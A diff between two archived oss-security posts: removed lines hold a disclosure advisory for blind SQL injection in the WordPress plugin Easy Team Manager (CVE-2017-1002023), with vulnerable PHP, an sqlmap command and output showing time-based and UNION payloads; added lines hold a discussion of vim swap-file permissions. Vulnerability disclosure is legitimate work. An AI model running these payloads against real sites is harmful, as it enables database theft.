@@ -1,59 +1,63 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/30/28
-Message-id: <C80A5E87-D9AD-4798-B878-57CA4A939759@me.com>
-Date: Tue, 30 May 2017 18:46:16 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Blind SQL Injection in Wordpress Plugin Easy Team Manager v1.3.2
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/11/05/8
+Message-ID: <a49425b0-4404-d570-a94d-fe92b59864b6@Z5T1.com>
+Date: Sun, 5 Nov 2017 13:19:43 -0500
+From: Scott Court <z5t1@...1.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Fw: Security risk of vim swap files
 Content-Type: text/plain; charset=utf-8
 
-Title: Blind SQL Injection in Wordpress Plugin Easy Team Manager v1.3.2
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-05-24
-CVE-ID:[CVE-2017-1002023]
-Download Site: https://wordpress.org/plugins/easy-team-manager/
-Vendor: https://daisythemes.com/
-Vendor Notified: 2017-05-24
-Vendor Contact: web form contact
-Advisory: http://www.vapidlabs.com/advisory.php?v=194
-Description: Easy Team Manager helps you to create team members with their short descriptions, social profiles link with smooth hover effects.
-Vulnerability:
-The following code does not sanitize $_GET['id'] before making it part of an SQL statement in file ./easy-team-manager/inc/easy_team_manager_desc_edit.php:
+Just want to point out that even if we do set 0600 permissions on all
+.swp files, it still may allow for a form of the attack Hanno originally
+pointed out if vim is ever run as the httpd user. In reality, this is
+far less likely to occur but it's still worth pointing out.
 
-85-        global $wpdb;	
-86-        $easy_team_manager_desc = $wpdb->get_results("SELECT *from ".$wpdb->prefix."easy_team_manager_description where id=".$_GET['id']);
-87-		foreach ($easy_team_manager_desc as $s ){
-88-			$ind_name_detail = unserialize($s->name);
-89-			$socia_media = unserialize($s->social_media);
-90:			$id=$_GET['id'];
-91-			$ind_position = esc_attr($s->position);
-92-			$ind_image=$s->image;
-93-			$ind_email_detail = unserialize($s->email);
-94-			$ind_phone_detail = unserialize($s->phone);
-95-			$ind_desc = esc_attr(stripcslashes($s->ind_description));
+Storing the .swp files in a separate directory prevents this from
+potentially being a problem as well. However, universally setting the
+.swp files to 0600 is probably a better solution than that patch
+(https://github.com/vim/vim/releases/tag/v8.0.1263).
 
-This allows blind SQL injection via the id parameter by an authenticated user with edit team priveledges. 
 
-Exploit Code:
-	• $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?page=easy_team_manager_edit&id=*' --load-cookies=./cookies.txt --level=4 --risk=3 --dbms=mysql
-	•  
-	• [08:39:09] [INFO] URI parameter '#1*' is 'MySQL UNION query (84) - 1 to 20 columns' injectable
-	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
-	• sqlmap identified the following injection point(s) with a total of 3115 HTTP(s) requests:
-	• ---
-	• Parameter: #1* (URI)
-	•     Type: AND/OR time-based blind
-	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
-	•     Payload: http://example.com:80/wordpress/wp-admin/admin.php?page=easy_team_manager_edit&id=(CASE WHEN (3623=3623) THEN SLEEP(5) ELSE 3623 END)
-	•     Type: UNION query
-	•     Title: MySQL UNION query (84) - 5 columns
-	•     Payload: http://example.com:80/wordpress/wp-admin/admin.php?page=easy_team_manager_edit&id=-5307 UNION ALL SELECT 84,CONCAT(0x7170787a71,0x58795a426e467457726744686879446f4e4d7a576a464758516e6765526549536279426759527443,0x7178787171),84,84,84#
-	• ---
-	• [08:39:15] [INFO] the back-end DBMS is MySQL
-	• web server operating system: Linux Ubuntu 16.04 (xenial)
-	• web application technology
-	• : Apache 2.4.18
-	• back-end DBMS: MySQL >= 5.0.12
-	• [08:39:15] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
-	•  
-	• [*] shutting down at 08:39:15
+On 11/05/2017 12:59 PM, Solar Designer wrote:
+> On Sun, Nov 05, 2017 at 06:17:04PM +0100, Christian Brabandt wrote:
+>> On Fr, 03 Nov 2017, Jakub Wilk wrote:
+>>
+>>> In general, what vim does (copying mode bits) in not enough to ensure that
+>>> the swapfile is readable only by the users who had access to the original
+>>> file. It would have to copy also group ownership and ACLs.
+>> I think patch https://github.com/vim/vim/releases/tag/v8.0.1263 fixes 
+>> the group ownership problem.
+> That's some effort and code complexity for a fix that is not even trying
+> to address the problem Hanno pointed out. :-(  What we really need is
+> simply forcing the permissions to 0600 no matter what.  I do notice that,
+> non-surprisingly, Bram said:
+>
+> | Why would a web server expose and serve such a file?  That clearly is
+> | the problem, not that Vim happens to create swap files (and undo and
+> | backup files, depending on your configuration).
+> | 
+> | You probably also create new files and copies of files that should not
+> | be served.  If you care about security, the web server must always use
+> | whitelisting, only serve files that were intentionally made public.
+>
+> This makes sense, yet Vim can and should also do its part to make things
+> safer when that does not conflict with its other goals nor introduce
+> complexity.  Simply using mode 0600 is a win-win: addresses the problem
+> Hanno reported for the common special case of web server running as a
+> different user than the file owner, does not break any functionality,
+> and makes Vim's code simpler.
+>
+> Yes, let's also force 0600 for "undo and backup files", please.
+>
+> Even without a web server or whatever other external interaction
+> aspects, copying the original file's permissions and/or obeying umask is
+> just wrong in this case because those files are created implicitly,
+> often without the user's intent and knowledge, and because they might
+> stay around for longer than the original file does.
+>
+> Alexander
+
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
